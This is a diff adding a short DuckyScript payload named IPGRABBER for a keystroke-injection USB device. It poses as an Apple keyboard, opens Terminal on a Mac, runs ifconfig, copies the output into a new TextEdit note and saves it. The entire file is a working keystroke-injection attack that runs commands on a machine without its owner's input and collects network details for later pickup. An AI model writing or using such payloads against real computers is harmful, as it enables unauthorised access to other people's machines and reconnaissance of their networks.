@@ -1,0 +1,31 @@
+REM Title: IPGRABBER
+REM Author: NANDOFROMTHEBANDO
+REM Description: Opens terminal and gets ifconfig information and saves it to a note file
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 2000 
+STRING ifconfig
+DELAY 500
+ENTER
+DELAY 1000
+GUI a
+DELAY 500
+GUI c
+DELAY 500
+GUI SPACE
+STRING TextEdit
+DELAY 1000
+ENTER
+DELAY 500
+GUI n
+DELAY 1000
+GUI v
+DELAY 1000
+GUI s
